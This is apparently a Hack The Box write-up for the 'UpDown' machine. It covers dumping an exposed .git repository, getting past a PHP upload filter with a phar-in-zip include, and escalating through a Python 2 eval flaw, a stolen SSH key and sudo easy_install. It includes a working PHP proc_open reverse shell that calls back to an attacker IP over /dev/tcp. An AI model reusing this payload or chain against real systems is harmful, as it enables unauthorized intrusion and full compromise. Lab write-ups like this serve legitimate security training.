---
layout: post
title: "UpDown - Hack The Box"
summary: "Dumped publicly accessible .git repository using git-dumper tool, extracted source code revealing Special-Dev header requirement and file upload filter logic, bypassed file upload filter using .phar extension (phar protocol combined with zip compression), exploited phar include to upload and execute PHP reverse shell bypassing extension filters, gained www-data shell, discovered Python2 script with eval() vulnerability running as developer user, executed /bin/bash via eval to gain developer shell, copied SSH private key to establish SSH session, discovered sudo easy_install privilege, exploited GTFOBins easy_install technique to gain root shell."
---

# UpDown - Hack The Box

## Enumeration
### Nmap
Initial Nmap scan revealed SSH and HTTP ports open.

<img width="970" height="248" alt="00 - nmap out" src="https://github.com/user-attachments/assets/d10ee9d7-df13-495a-80ed-a3374f454655" />

### Web Enumeration
Website revealed that the domain is siteisup.htb, thus I added it to /etc/hosts file.

<img width="1632" height="760" alt="01 - siteisup" src="https://github.com/user-attachments/assets/c72b912d-d972-49c3-92c7-7bce8380da80" />

### Directory Brute Forcing
Directory brute forcing with common names revealed that there is directory named /dev. And inside it there is a .git file available.

<img width="1389" height="831" alt="02 - directory brute force" src="https://github.com/user-attachments/assets/bd76e54a-219d-4e19-a0fe-65a768da1025" />

<img width="1531" height="677" alt="03 -  git" src="https://github.com/user-attachments/assets/d97e12ca-0871-4ee9-b4f2-4f52fd355649" />

### Git Dumper
I used [git-dumper](https://github.com/arthaud/git-dumper) tool to dump files using publicly accessible .git file.

<img width="1712" height="406" alt="04 - git dumper" src="https://github.com/user-attachments/assets/c4c15292-6c12-4c04-8912-2dbfdd7eeaf4" />

It revealed php files and .htaccess file which is a php configuration file.

<img width="742" height="257" alt="05 - inside the dev" src="https://github.com/user-attachments/assets/7d3948b5-30db-4559-a070-9d65bec65870" />

Reading the .htaccess file revealed that there is required header Special-Dev to access dev site.

<img width="576" height="136" alt="07 - 0 required header" src="https://github.com/user-attachments/assets/91e393bc-b683-48e6-9833-c3156b4b5f2b" />

### Subdomain Brute Force
After analyzing the files from dev site, I applied subdomain enumeration to find the subdomain that the dev site is running on. As expected it returned 'dev' subdomain.

<img width="1011" height="404" alt="06 - dev subdomain" src="https://github.com/user-attachments/assets/2544874f-25af-4bfe-aff8-0ecf14c41fba" />

### Burp Update
Then I opened Burp Suite and set match-replace rule to add Special-Dev header to every request.

<img width="1105" height="621" alt="07 - 1 header replace rule burp" src="https://github.com/user-attachments/assets/b8db24e1-3c13-45ca-9d21-1b6dbba3166d" />

### Analyzing Dev Website
At first I checked index.php, it is simply getting page parameter and concatting .php at the end and rendering this page. If no parameter is given it is running checker.php file.

<img width="742" height="257" alt="07 - index php" src="https://github.com/user-attachments/assets/79d74136-d1da-4a03-aec8-a191459c4893" />

Then analyzed checker.php file. It checks for extension and filters any known extension that can be malicious. Then creates a folder under the uploads folder using MD5 of timestamp and puts the file inside it. And after reading line by line and checking connectivity, it deletes the file.

<img width="1165" height="817" alt="08 - checker php" src="https://github.com/user-attachments/assets/7a1bb8de-614a-4940-a95b-7ab96437b1ec" />

<img width="1674" height="723" alt="09 - uploads" src="https://github.com/user-attachments/assets/653bda5e-6c73-46f2-83a4-59b4934abc44" />

It is filtering known extensions but there is no filter for phar extensions. [Phar](https://www.php.net/manual/en/intro.phar.php) is special format that can be used to include files inside compressed zip files (For example: include 'phar:///path/to/file.zip/file.php';).
But zip or other known extension are blocked. So I created a phpinfo() file and compressed the file with .mto extension.

<img width="1461" height="207" alt="10 - revshell" src="https://github.com/user-attachments/assets/fc1ddffe-9855-41ad-aa44-386c908e2334" />

I know that index.php includes files that are given with page parameter. So giving it a phar link reveals php info page.

<img width="1508" height="715" alt="11 - file" src="https://github.com/user-attachments/assets/f27d7187-8209-43b7-81b0-e4492a4c2177" />

I tested some reverse shells and it did not work. Then checking phpinfo page, I understood that some functions are disabled. So either I can check meanually or I can run [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser/blob/master/dfunc-bypasser.py) script to check if there is known function that is not excluded.

I first need to update dfunc-bypasser script to send requests with Special-Dev header.

<img width="669" height="80" alt="12 - function update dfunc" src="https://github.com/user-attachments/assets/f65e33cd-25be-4521-aca4-fd911cec0c08" />

Then running it revealed proc_open function is allowed, and it is malicious. It can be used to run shell commands. You can check out [documentation](https://www.php.net/manual/en/function.proc-open.php) for more information.

<img width="1377" height="469" alt="13 - proc open" src="https://github.com/user-attachments/assets/e38c1195-3701-472a-ba85-956aa6bf989c" />

## Exploitation
### Creating proc_open reverse shell
After learning proc_open is allowed, I created a reverse shell script as below:
```php
<?php
$descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.12/1234 0>&1'";
$proc = proc_open($cmd, $descspec, $pipes);
?>
```

### Uploading and Getting Reverse Shell
Then zipped the shell using .mto extension and uploaded it.

<img width="1516" height="227" alt="14 - revshell" src="https://github.com/user-attachments/assets/728dcf0f-2291-42b1-9b77-09ebea151387" />

Visiting the site while listening with netcat gets me reverse shell as www-data.

<img width="1448" height="750" alt="15 - shell" src="https://github.com/user-attachments/assets/894dacab-7fce-45be-949c-71e772fe94f7" />

### Python2 Code Execution
As www-data, I can not read user.txt on the home page. I tried some privilege escalation methods which did not work. Then found dev folder inside home folder. Inside it there was a python2 script that gets an input from the user and a binary that calls that python script as developer user.

<img width="612" height="201" alt="16 - siteisup py" src="https://github.com/user-attachments/assets/2efce666-e74d-46e3-afbf-61f40af849a0" />

Python 2 passes any input that is given via input() function to the eval function, so we can run shell commands. To test it I ran id command and the output showed that my id is developer's id but my group id is www-data.

<img width="966" height="441" alt="17 - command execution" src="https://github.com/user-attachments/assets/23f26fba-837c-450d-ad06-6350499fc649" />

Then simply run /bin/bash and got the shell.

<img width="528" height="169" alt="18 - got the shell" src="https://github.com/user-attachments/assets/80a6440f-73c3-4b2c-941e-a82d303bfcfe" />

### SSH
But I still can not read user.txt because my group is www-data and the user.txt is owned by root and the developer group can read it. 

Thus, I copied ~/.ssh/id_rsa to login via SSH as the developer user.

<img width="948" height="420" alt="19 - ssh" src="https://github.com/user-attachments/assets/7f7c33e3-2d26-4a36-8855-776ffdb089b6" />

And then simply logged in.

<img width="1038" height="777" alt="20 - got the shell" src="https://github.com/user-attachments/assets/2b03b0ba-f3d4-4cff-b84b-35b3572236d3" />

## Privilege Escalation
### sudo -l 
Running sudo -l revealed I can run easy_install as sudo. And this file is deprecated python installer file, it simply gets a name and installs it.

<img width="1241" height="248" alt="21 - sudo -l and file" src="https://github.com/user-attachments/assets/833180ab-5b2f-4aee-9b48-84a3562d23c9" />

### GTFOBins
After some research, I found [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) page for easy_install is available. So I simply applied the steps and got the root shell.

<img width="1108" height="193" alt="22 - got the root" src="https://github.com/user-attachments/assets/42ed85f6-1e69-442d-b768-113fc3381fca" />

## Pwned
The machine was fully compromised.

<img width="728" height="617" alt="23 - pned" src="https://github.com/user-attachments/assets/80488272-e3fc-4b2d-82fa-57cb7164ac85" />
